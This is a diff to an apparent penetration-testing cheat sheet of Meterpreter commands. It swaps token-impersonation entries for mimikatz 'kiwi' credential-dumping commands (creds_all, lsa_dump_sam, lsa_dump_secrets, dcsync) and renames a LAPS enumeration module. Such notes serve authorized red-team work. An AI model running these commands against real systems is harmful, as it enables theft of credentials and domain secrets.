@@ -45,16 +45,29 @@ exploit -j
 use auxiliary/server/socks_proxy
 ```
 
-## load incognito 
+## load kiwi (mimikatz)
 #plateform/linux #target/local #cat/PRIVESC  
 ```
-load incognito
+load kiwi
 ```
 
-## incognito impersonate token
+## kiwi - credential dump (mimikatz)
 #plateform/linux #target/local #cat/PRIVESC  
 ```
-impersonate_token <domain>\\<user>
+creds_all
+```
+
+## kiwi - logonpasswords (mimikatz)
+#plateform/linux #target/local #cat/PRIVESC  
+```
+lsa_dump_sam
+lsa_dump_secrets
+```
+
+## kiwi - dcsync (mimikatz)
+#plateform/linux #target/local #cat/PRIVESC  
+```
+dcsync <domain_controller_name>
 ```
 ## create process
 #plateform/linux #target/local #cat/UTILS 
@@ -79,6 +92,6 @@ creds_all
 ## enum LAPS
 #plateform/linux #target/local #cat/ATTACK
 ```
-use post/windows/gather/credentials/enum_laps
+use post/windows/gather/laps
 ```
 
